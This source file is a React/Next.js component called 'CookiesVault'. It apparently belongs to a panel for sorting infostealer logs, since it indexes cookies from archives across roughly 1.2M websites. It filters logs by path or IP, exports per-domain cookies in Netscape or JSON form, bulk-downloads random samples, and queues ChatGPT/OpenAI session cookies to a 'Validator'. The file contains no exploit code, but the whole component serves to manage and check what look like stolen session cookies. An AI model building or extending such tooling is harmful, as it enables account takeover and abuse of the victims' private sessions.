"use client";

import Link from "next/link";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { toast } from "sonner";
import {
  ArrowUpRight,
  CheckCircle2,
  Copy,
  Download,
  FileCode,
  FileText,
  Globe,
  Loader2,
  RotateCcw,
  Search,
  Shuffle,
  WrapText,
} from "lucide-react";
import { Icon3D, SpringCounter } from "@/components/kinetics-ui";
import { MotionSurface } from "@/components/motion-surface";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { SegmentedControl } from "@/components/ui/segmented-control";
import {
  browserAddValidationDomain,
  browserAddValidationLog,
  browserListCookieDomainLogs,
  browserListCookieDomains,
  browserReindexAllArchives,
  cookieBulkDownloadUrl,
} from "@/lib/api";
import { CodeViewer } from "@/components/code-viewer";
import type { CookieDomainLogItem, CookieDomainSummary } from "@/lib/api";
import { cn, copyToClipboard } from "@/lib/utils";

// Module-level in-memory cache so revisiting /cookies or switching domains is 0ms instant
let cachedDomainsSnapshot: {
  allDomains: CookieDomainSummary[];
  totalDomains: number;
  totalLogs: number;
  totalCookies: number;
} | null = null;

const cachedDomainLogsMap = new Map<string, CookieDomainLogItem[]>();

export function CookiesVault() {
  const [loadedDomains, setLoadedDomains] = useState<CookieDomainSummary[]>([]);
  const [filteredCount, setFilteredCount] = useState<number>(0);
  const [hasMore, setHasMore] = useState(true);
  const [isLoadingDomains, setIsLoadingDomains] = useState(true);
  const [isLoadingMore, setIsLoadingMore] = useState(false);
  const [domainQuery, setDomainQuery] = useState("");
  const [scrollTop, setScrollTop] = useState(0);
  const [containerHeight, setContainerHeight] = useState(600);

  const [totalDomains, setTotalDomains] = useState(0);
  const [totalLogs, setTotalLogs] = useState(0);
  const [totalCookies, setTotalCookies] = useState(0);

  const [selectedDomain, setSelectedDomain] = useState<CookieDomainSummary | null>(null);
  const [logs, setLogs] = useState<CookieDomainLogItem[]>([]);
  const [isLoadingLogs, setIsLoadingLogs] = useState(false);
  const [logQuery, setLogQuery] = useState("");

  const [selectedLog, setSelectedLog] = useState<CookieDomainLogItem | null>(null);
  const [viewFormat, setViewFormat] = useState<"netscape" | "json">("netscape");
  const [wrapLines, setWrapLines] = useState(true);
  const [randomCountInput, setRandomCountInput] = useState("100");
  const [isReindexing, setIsReindexing] = useState(false);

  const logsReqRef = useRef(0);
  const domainsAbortRef = useRef<AbortController | null>(null);
  const searchTimerRef = useRef<number | undefined>(undefined);
  const domainsContainerRef = useRef<HTMLDivElement>(null);

  const loadDomainLogs = useCallback(
    async (domainObj: CookieDomainSummary, forceRefresh = false) => {
      setSelectedDomain(domainObj);
      const cached = !forceRefresh
        ? cachedDomainLogsMap.get(domainObj.domain)
        : undefined;
      if (cached !== undefined) {
        setLogs(cached);
        setSelectedLog(cached.length > 0 ? cached[0] : null);
        setIsLoadingLogs(false);
        return;
      }

      const reqId = ++logsReqRef.current;
      setIsLoadingLogs(true);
      const res = await browserListCookieDomainLogs(domainObj.domain, "");
      if (reqId !== logsReqRef.current) return;
      setIsLoadingLogs(false);
      if (res.ok) {
        cachedDomainLogsMap.set(domainObj.domain, res.data.logs);
        setLogs(res.data.logs);
        setSelectedLog(res.data.logs.length > 0 ? res.data.logs[0] : null);
      } else {
        toast.error(res.error?.message ?? "Failed to load logs for domain.");
      }
    },
    [],
  );

  const fetchDomains = useCallback(
    async (q: string, offset: number, append: boolean) => {
      let signal = domainsAbortRef.current?.signal;
      if (!append) {
        domainsAbortRef.current?.abort();
        const ctrl = new AbortController();
        domainsAbortRef.current = ctrl;
        signal = ctrl.signal;
      }
      if (offset === 0) setIsLoadingDomains(true);
      else setIsLoadingMore(true);

      try {
        const res = await browserListCookieDomains(
          q,
          150,
          offset,
          signal,
        );
        if (signal?.aborted || (!res.ok && res.aborted)) return;
        if (res.ok) {
          setTotalDomains(res.data.totalDomains);
          setTotalLogs(res.data.totalLogs);
          setTotalCookies(res.data.totalCookies);
          setFilteredCount(res.data.filteredCount ?? res.data.totalDomains);
          setHasMore(res.data.hasMore ?? false);

          if (append) {
            setLoadedDomains((prev) => [...prev, ...res.data.domains]);
          } else {
            setLoadedDomains(res.data.domains);
            setScrollTop(0);
            if (domainsContainerRef.current) {
              domainsContainerRef.current.scrollTop = 0;
            }
            if (res.data.domains.length > 0) {
              void loadDomainLogs(res.data.domains[0], false);
            } else {
              logsReqRef.current++;
              setSelectedDomain(null);
              setLogs([]);
              setSelectedLog(null);
              setIsLoadingLogs(false);
            }
          }
        }
      } catch {
        // Aborted or network error
      } finally {
        if (!signal?.aborted && !domainsAbortRef.current?.signal.aborted) {
          setIsLoadingDomains(false);
          setIsLoadingMore(false);
        }
      }
    },
    [loadDomainLogs],
  );

  useEffect(() => {
    void fetchDomains("", 0, false);
    return () => {
      domainsAbortRef.current?.abort();
    };
  }, [fetchDomains]);

  useEffect(() => {
    const el = domainsContainerRef.current;
    if (!el) return;
    if (el.clientHeight > 0) {
      setContainerHeight(el.clientHeight);
    }
    if (typeof ResizeObserver === "undefined") return;
    const ro = new ResizeObserver((entries) => {
      for (const entry of entries) {
        const h = entry.contentRect.height || el.clientHeight;
        if (h > 0) {
          setContainerHeight(h);
        }
      }
    });
    ro.observe(el);
    return () => ro.disconnect();
  }, []);
  const handleDomainSearch = (val: string) => {
    setDomainQuery(val);
    window.clearTimeout(searchTimerRef.current);
    searchTimerRef.current = window.setTimeout(() => {
      void fetchDomains(val, 0, false);
    }, 200);
  };

  const handleScroll = (e: React.UIEvent<HTMLDivElement>) => {
    const t = e.currentTarget;
    setScrollTop(t.scrollTop);
    if (t.clientHeight !== containerHeight) {
      setContainerHeight(t.clientHeight);
    }
    if (hasMore && !isLoadingMore && !isLoadingDomains && t.scrollTop + t.clientHeight >= t.scrollHeight - 350) {
      void fetchDomains(domainQuery, loadedDomains.length, true);
    }
  };

  // Virtual windowing calculations (every-uuid style)
  const ROW_HEIGHT = 52;
  const OVERSCAN = 6;
  const startIndex = Math.max(0, Math.floor(scrollTop / ROW_HEIGHT) - OVERSCAN);
  const endIndex = Math.min(
    loadedDomains.length,
    Math.ceil((scrollTop + containerHeight) / ROW_HEIGHT) + OVERSCAN,
  );
  const visibleDomains = loadedDomains.slice(startIndex, endIndex);
  const paddingTop = startIndex * ROW_HEIGHT;
  const paddingBottom = Math.max(0, (loadedDomains.length - endIndex) * ROW_HEIGHT);
  // Instant 0ms client-side log filtering by path/IP
  const filteredLogs = useMemo(() => {
    const q = logQuery.trim().toLowerCase();
    if (!q) return logs;
    return logs.filter(
      (it) =>
        it.entryPath.toLowerCase().includes(q) ||
        it.archiveFilename.toLowerCase().includes(q) ||
        it.entryName.toLowerCase().includes(q),
    );
  }, [logs, logQuery]);



  const handleReindex = async () => {
    if (isReindexing) return;
    setIsReindexing(true);
    toast.info("Extracting & indexing cookies across all archives…");
    const res = await browserReindexAllArchives();
    setIsReindexing(false);
    if (res.ok) {
      cachedDomainsSnapshot = null;
      cachedDomainLogsMap.clear();
      toast.success(
        `Indexed cookies across ${res.data.reindexed} of ${res.data.total} archives.`,
      );
      void fetchDomains("", 0, false);
    } else {
      toast.error(res.error?.message ?? "Reindexing failed.");
    }
  };
  const topWebsite = selectedDomain?.domain ?? loadedDomains[0]?.domain ?? "—";

  const activeText = useMemo(() => {
    if (!selectedLog) return "";
    return viewFormat === "json"
      ? selectedLog.jsonText
      : selectedLog.netscapeText;
  }, [selectedLog, viewFormat]);

  const textLines = useMemo(() => {
    if (!activeText) return [];
    return activeText.split("\n");
  }, [activeText]);

  const parsedRandomCount = useMemo(() => {
    const n = parseInt(randomCountInput, 10);
    return Number.isFinite(n) && n > 0 ? n : 100;
  }, [randomCountInput]);

  const isSupportedDomain = Boolean(
    selectedDomain &&
      (selectedDomain.domain === "openai.com" ||
        selectedDomain.domain.endsWith(".openai.com") ||
        selectedDomain.domain === "chatgpt.com" ||
        selectedDomain.domain.endsWith(".chatgpt.com")),
  );

  return (
    <div className="flex flex-1 flex-col gap-5 spring-enter">
      {/* SpinupMail 3-Card Telemetry Strip */}
      <section className="grid grid-cols-1 gap-4 sm:grid-cols-3">
        <MotionSurface busy={isReindexing}>
          <div className="spinup-card flex flex-col justify-between p-5">
            <div className="flex items-center justify-between gap-2">
              <div className="flex items-center gap-2 text-xs font-medium text-neutral-400">
                <Globe className="size-4 text-neutral-400" />
                <span>Unique Domains</span>
              </div>
              <span className="spinup-pill">Root Normalized</span>
            </div>
            <div className="mt-3 flex items-baseline gap-2">
              <span className="text-3xl font-semibold tabular-nums tracking-tight text-white">
                <SpringCounter value={totalDomains} />
              </span>
              <span className="text-xs text-neutral-500">websites</span>
            </div>
          </div>
        </MotionSurface>

        <MotionSurface>
          <div className="spinup-card flex flex-col justify-between p-5">
            <div className="flex items-center justify-between gap-2">
              <div className="flex items-center gap-2 text-xs font-medium text-neutral-400">
                <FileText className="size-4 text-neutral-400" />
                <span>Separated Logs</span>
              </div>
              <span className="spinup-pill">Per-Archive</span>
            </div>
            <div className="mt-3 flex items-baseline gap-2">
              <span className="text-3xl font-semibold tabular-nums tracking-tight text-white">
                <SpringCounter value={totalLogs} />
              </span>
              <span className="text-xs text-neutral-500">files</span>
            </div>
          </div>
        </MotionSurface>

        <MotionSurface>
          <div className="spinup-card flex flex-col justify-between p-5">
            <div className="flex items-center justify-between gap-2">
              <div className="flex items-center gap-2 text-xs font-medium text-neutral-400">
                <FileCode className="size-4 text-neutral-400" />
                <span>Total Cookies</span>
              </div>
              <span className="spinup-pill truncate max-w-[140px] font-mono">
                {topWebsite}
              </span>
            </div>
            <div className="mt-3 flex items-baseline gap-2">
              <span className="text-3xl font-semibold tabular-nums tracking-tight text-white">
                <SpringCounter value={totalCookies} />
              </span>
              <span className="text-xs text-neutral-500">tokens</span>
            </div>
          </div>
        </MotionSurface>
      </section>

      {/* Bulk Download & Domain Action Bar */}
      {selectedDomain ? (
        <section className="spinup-card flex flex-wrap items-center justify-between gap-3 px-4 py-3">
          <div className="flex items-center gap-2.5">
            <Globe className="size-4 text-neutral-400" />
            <span className="font-mono text-sm font-semibold text-white">
              {selectedDomain.domain}
            </span>
            <span className="spinup-badge-active font-mono text-[11px]">
              {selectedDomain.logCount.toLocaleString()} separate logs
            </span>
            <span className="spinup-pill font-mono text-[11px]">
              {selectedDomain.totalCookies.toLocaleString()} cookies
            </span>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <Button
              asChild
              variant="outline"
              size="xs"
              className="motion-sheen gap-1.5 rounded-lg border-white/[0.08] bg-[#0e0f11] text-neutral-200 hover:bg-white/[0.04]"
            >
              <a
                href={cookieBulkDownloadUrl(
                  selectedDomain.domain,
                  undefined,
                  viewFormat,
                )}
                download
                title={`Download all ${selectedDomain.logCount} separate ${selectedDomain.domain} cookie files as a .zip (auto-deleted from /tmp)`}
              >
                <Download className="size-3" />
                Download All ({selectedDomain.logCount}) .zip
              </a>
            </Button>

            <div className="flex items-center gap-1 rounded-lg border border-white/[0.08] bg-[#0e0f11] px-2 py-0.5">
              <span className="text-[11px] text-neutral-400 pl-0.5">Random:</span>
              <input
                type="number"
                min={1}
                max={10000}
                value={randomCountInput}
                onChange={(e) => setRandomCountInput(e.target.value)}
                className="w-14 bg-transparent text-center font-mono text-xs text-white focus:outline-none"
                aria-label="Random cookie log count"
              />
              <Button asChild variant="secondary" size="xs" className="h-6 gap-1 rounded-md">
                <a
                  href={cookieBulkDownloadUrl(
                    selectedDomain.domain,
                    parsedRandomCount,
                    viewFormat,
                  )}
                  download
                  title={`Download ${parsedRandomCount} random ${selectedDomain.domain} cookie logs as a .zip (auto-deleted from /tmp)`}
                >
                  <Shuffle className="size-3" />
                  Download {parsedRandomCount} .zip
                </a>
              </Button>
            </div>

            {isSupportedDomain ? (
              <Button
                type="button"
                variant="outline"
                size="xs"
                onClick={async () => {
                  if (!selectedDomain) return;
                  toast.loading(`Sending ${selectedDomain.domain} to Validator…`, { id: "val-domain" });
                  const res = await browserAddValidationDomain(selectedDomain.domain, "chatgpt");
                  if (res.ok) {
                    toast.success(res.data.message || `Queued ${selectedDomain.domain} to Validator!`, { id: "val-domain" });
                  } else {
                    toast.error(res.error?.message ?? "Failed to send to validator", { id: "val-domain" });
                  }
                }}
                className="gap-1.5 rounded-lg border border-white/[0.08] bg-[#0e0f11] text-neutral-200 hover:bg-white/[0.06] hover:text-white"
              >
                <CheckCircle2 className="size-3 text-[#00ba7c]" />
                Send All to Validator
              </Button>
            ) : null}
          </div>
        </section>
      ) : null}

      {/* 3-Pane Explorer: Websites (Domains) | Per-Log Files | Stripped Cookie Viewer */}
      <div className="grid min-h-[620px] grid-cols-1 gap-4 lg:grid-cols-[17rem_minmax(0,0.95fr)_minmax(0,1.15fr)]">
        {/* Pane 1: Websites (Domains) */}
        <section className="spinup-card flex min-w-0 flex-col overflow-hidden">
          <div className="flex flex-col gap-2.5 border-b border-white/[0.07] p-3.5">
            <div className="flex items-center justify-between">
              <span className="text-xs font-semibold text-white">
                Websites ({filteredCount > 0 ? filteredCount.toLocaleString() : totalDomains.toLocaleString()})
              </span>
              <span className="spinup-pill font-mono text-[10px]">
                {loadedDomains.length < (filteredCount || totalDomains)
                  ? `Loaded ${loadedDomains.length.toLocaleString()}`
                  : "All loaded"}
              </span>
            </div>
            <div className="relative">
              <Search className="pointer-events-none absolute top-1/2 left-2.5 size-3.5 -translate-y-1/2 text-neutral-500" />
              <Input
                type="search"
                value={domainQuery}
                onChange={(e) => handleDomainSearch(e.target.value)}
                placeholder="Search all 1.2M websites…"
                className="spinup-input h-8 pl-8 text-xs"
              />
            </div>
          </div>

          <div
            ref={domainsContainerRef}
            onScroll={handleScroll}
            className="flex-1 overflow-y-auto max-h-[600px] divide-y divide-white/[0.04]"
          >
            {isLoadingDomains && loadedDomains.length === 0 ? (
              <div className="flex items-center justify-center gap-2 py-12 text-xs text-neutral-400">
                <Loader2 className="size-4 animate-spin text-neutral-400" />
                Loading websites…
              </div>
            ) : loadedDomains.length === 0 ? (
              <div className="flex flex-col items-center justify-center gap-3 p-6 text-center">
                <p className="text-xs text-neutral-400">
                  {domainQuery ? `No websites match "${domainQuery}".` : "No domain cookies indexed yet."}
                </p>
                <Button
                  type="button"
                  variant="outline"
                  size="xs"
                  onClick={handleReindex}
                  disabled={isReindexing}
                  className="motion-sheen gap-1.5 rounded-lg"
                >
                  <RotateCcw
                    className={cn("size-3", isReindexing && "animate-spin")}
                  />
                  {isReindexing ? "Indexing Cookies…" : "Index Existing Archives"}
                </Button>
              </div>
            ) : (
              <>
                {paddingTop > 0 ? <div style={{ height: `${paddingTop}px` }} aria-hidden /> : null}

                {visibleDomains.map((dom) => {
                  const isActive = selectedDomain?.domain === dom.domain;
                  return (
                    <button
                      key={dom.domain}
                      type="button"
                      style={{ height: `${ROW_HEIGHT}px` }}
                      onClick={() => {
                        setLogQuery("");
                        void loadDomainLogs(dom, false);
                      }}
                      className={cn(
                        "flex w-full items-center justify-between gap-2 px-3.5 text-left transition-none cursor-pointer",
                        isActive
                          ? "bg-white/[0.06] text-white"
                          : "text-neutral-400 hover:bg-white/[0.025] hover:text-white"
                      )}
                    >
                      <div className="flex min-w-0 items-center gap-2">
                        <Globe className="size-3.5 shrink-0 text-neutral-500" />
                        <span className="truncate font-mono text-xs font-medium">
                          {dom.domain}
                        </span>
                      </div>
                      <span className="spinup-pill shrink-0 font-mono text-[10px]">
                        {dom.logCount.toLocaleString()}
                      </span>
                    </button>
                  );
                })}

                {paddingBottom > 0 ? <div style={{ height: `${paddingBottom}px` }} aria-hidden /> : null}

                {isLoadingMore ? (
                  <div className="flex items-center justify-center py-2.5 text-xs text-neutral-400 font-mono">
                    <Loader2 className="size-3 animate-spin mr-1.5 text-neutral-400" />
                    Streaming more websites…
                  </div>
                ) : null}
              </>
            )}
          </div>
        </section>

        {/* Pane 2: Separated Cookie Files per Log for Selected Website */}
        <section className="spinup-card flex min-w-0 flex-col overflow-hidden">
          <div className="flex flex-col gap-2.5 border-b border-white/[0.07] p-3.5">
            <div className="flex items-center justify-between">
              <span className="truncate text-xs font-semibold text-white">
                {selectedDomain
                  ? `${selectedDomain.domain} — Logs (${filteredLogs.length})`
                  : "Select a website"}
              </span>
              <span className="spinup-pill text-[10px]">Per-log files</span>
            </div>
            <div className="relative">
              <Search className="pointer-events-none absolute top-1/2 left-2.5 size-3.5 -translate-y-1/2 text-neutral-500" />
              <Input
                type="search"
                value={logQuery}
                onChange={(e) => setLogQuery(e.target.value)}
                disabled={!selectedDomain}
                placeholder="Filter logs by path or IP…"
                className="spinup-input h-8 pl-8 text-xs"
              />
            </div>
          </div>

          <div className="flex-1 divide-y divide-white/[0.04] overflow-y-auto max-h-[600px]">
            {isLoadingLogs ? (
              <div className="flex items-center justify-center gap-2 py-12 text-xs text-neutral-400">
                <Loader2 className="size-4 animate-spin" />
                Loading separated logs…
              </div>
            ) : filteredLogs.length === 0 ? (
              <div className="py-12 text-center text-xs text-neutral-500">
                No logs found for this website.
              </div>
            ) : (
              filteredLogs.map((item) => {
                const isSelected = selectedLog?.id === item.id;
                return (
                  <div
                    key={item.id}
                    className={cn(
                      "flex flex-col gap-1.5 px-3.5 py-3 transition-none",
                      isSelected
                        ? "bg-white/[0.06]"
                        : "hover:bg-white/[0.02]",
                    )}
                  >
                    <button
                      type="button"
                      onClick={() => setSelectedLog(item)}
                      className="flex min-w-0 w-full items-center justify-between gap-2 text-left"
                    >
                      <div className="flex min-w-0 items-center gap-2">
                        <FileText className="size-3.5 shrink-0 text-neutral-400" />
                        <span className="truncate font-mono text-xs font-medium text-white">
                          {item.domain} — {item.entryName}
                        </span>
                      </div>
                      <span className="spinup-pill shrink-0 font-mono text-[10px]">
                        {item.cookieCount} cookies
                      </span>
                    </button>

                    <div className="flex items-center justify-between pt-0.5">
                      <Link
                        href={`/archives/${item.archiveId}?path=${encodeURIComponent(item.entryPath)}`}
                        className="group inline-flex items-center gap-1 truncate font-mono text-[11px] text-neutral-500 hover:text-neutral-200 hover:underline"
                        title={`Open in Archive File Viewer: ${item.archiveFilename} → ${item.entryPath}`}
                      >
                        <span className="truncate">
                          {item.archiveFilename} / {item.entryPath}
                        </span>
                        <ArrowUpRight className="size-3 shrink-0 opacity-70 group-hover:opacity-100" />
                      </Link>

                      {item.domain === "openai.com" ||
                      item.domain.endsWith(".openai.com") ||
                      item.entryPath.toLowerCase().includes("openai") ? (
                        <button
                          type="button"
                          onClick={async (e) => {
                            e.stopPropagation();
                            toast.loading("Sending to Validator…", { id: `val-${item.id}` });
                            const res = await browserAddValidationLog(item.id, "chatgpt");
                            if (res.ok) {
                              toast.success("Queued to Validator!", { id: `val-${item.id}` });
                            } else {
                              toast.error(res.error?.message ?? "Failed to queue log", { id: `val-${item.id}` });
                            }
                          }}
                          title="Send this log to Cookie Validator"
                          className="spinup-pill inline-flex items-center gap-1 text-[10px] text-neutral-200 hover:text-white hover:bg-white/[0.06] transition-none cursor-pointer shrink-0 ml-2"
                        >
                          <CheckCircle2 className="size-2.5 text-[#00ba7c]" />
                          Check
                        </button>
                      ) : null}
                    </div>
                  </div>
                );
              })
            )}
          </div>
        </section>

        {/* Pane 3: Stripped Domain Cookie Inspector (Netscape / JSON) */}
        <section className="spinup-card flex min-w-0 flex-col overflow-hidden">
          {selectedLog === null ? (
            <div className="flex flex-1 flex-col items-center justify-center gap-2 p-8 text-center">
              <FileCode className="size-6 text-neutral-500" />
              <p className="text-sm font-medium text-white">
                Select a log to view stripped {selectedDomain?.domain ?? "domain"}{" "}
                cookies
              </p>
              <p className="max-w-xs text-xs text-neutral-500">
                Only cookies belonging to the selected website are shown,
                cleanly separated from all other domains in that log file.
              </p>
            </div>
          ) : (
            <>
              <div className="flex flex-wrap items-center justify-between gap-2 border-b border-white/[0.07] px-4 py-3">
                <div className="min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="truncate font-mono text-xs font-semibold text-white">
                      {selectedLog.domain}
                    </span>
                    <span className="spinup-pill font-mono text-[10px]">
                      {selectedLog.cookieCount} cookies
                    </span>
                  </div>
                  <Link
                    href={`/archives/${selectedLog.archiveId}?path=${encodeURIComponent(selectedLog.entryPath)}`}
                    className="mt-0.5 inline-flex max-w-full items-center gap-1 truncate font-mono text-[11px] text-neutral-500 hover:text-neutral-200 hover:underline"
                  >
                    <span className="truncate">{selectedLog.entryPath}</span>
                    <ArrowUpRight className="size-3 shrink-0" />
                  </Link>
                </div>

                <div className="flex flex-wrap items-center gap-1.5">
                  <SegmentedControl
                    label="Cookie format"
                    value={viewFormat}
                    onValueChange={(value) => setViewFormat(value as "netscape" | "json")}
                    options={[
                      { value: "netscape", label: "Netscape" },
                      { value: "json", label: "JSON" },
                    ]}
                    size="sm"
                  />

                  {selectedLog &&
                  (selectedLog.domain === "openai.com" ||
                    selectedLog.domain.endsWith(".openai.com")) ? (
                    <Button
                      type="button"
                      variant="outline"
                      size="xs"
                      onClick={async () => {
                        if (!selectedLog) return;
                        toast.loading("Sending log to Validator…", { id: `val-inspect-${selectedLog.id}` });
                        const res = await browserAddValidationLog(selectedLog.id, "chatgpt");
                        if (res.ok) {
                          toast.success("Queued to Validator!", { id: `val-inspect-${selectedLog.id}` });
                        } else {
                          toast.error(res.error?.message ?? "Failed to queue log", { id: `val-inspect-${selectedLog.id}` });
                        }
                      }}
                      className="gap-1.5 rounded-lg border border-white/[0.08] bg-[#0e0f11] text-neutral-200 hover:bg-white/[0.06] hover:text-white"
                    >
                      <CheckCircle2 className="size-3 text-[#00ba7c]" />
                      Send to Validator
                    </Button>
                  ) : null}

                  <Button
                    type="button"
                    variant="outline"
                    size="xs"
                    onClick={async () => {
                      const ok = await copyToClipboard(selectedLog.netscapeText);
                      if (ok) {
                        toast.success(
                          `Copied ${selectedLog.domain} cookies (Netscape format).`,
                        );
                      } else {
                        toast.error("Failed to copy cookies to clipboard.");
                      }
                    }}
                    className="gap-1.5 rounded-lg border-white/[0.08] bg-[#0e0f11]"
                  >
                    <Copy className="size-3" />
                    Copy (Netscape)
                  </Button>

                  <Button
                    type="button"
                    variant="outline"
                    size="xs"
                    className="gap-1.5 rounded-lg border-white/[0.08] bg-[#0e0f11]"
                    onClick={async () => {
                      const ok = await copyToClipboard(selectedLog.jsonText);
                      if (ok) {
                        toast.success(
                          `Copied ${selectedLog.domain} cookies (JSON format).`,
                        );
                      } else {
                        toast.error("Failed to copy cookies to clipboard.");
                      }
                    }}
                  >
                    <Copy className="size-3" />
                    Copy (JSON)
                  </Button>

                  <Button
                    type="button"
                    variant="ghost"
                    size="xs"
                    onClick={() => setWrapLines((w) => !w)}
                    className="text-neutral-400 hover:text-white"
                  >
                    <WrapText className="size-3" />
                  </Button>
                </div>
              </div>

              <div className="flex-1 overflow-auto p-3.5 max-h-[560px]">
                <CodeViewer
                  content={activeText}
                  filename={viewFormat === "json" ? `${selectedLog.domain}.json` : `${selectedLog.domain}.txt`}
                  wrapLines={wrapLines}
                />
              </div>
            </>
          )}
        </section>
      </div>
    </div>
  );
}
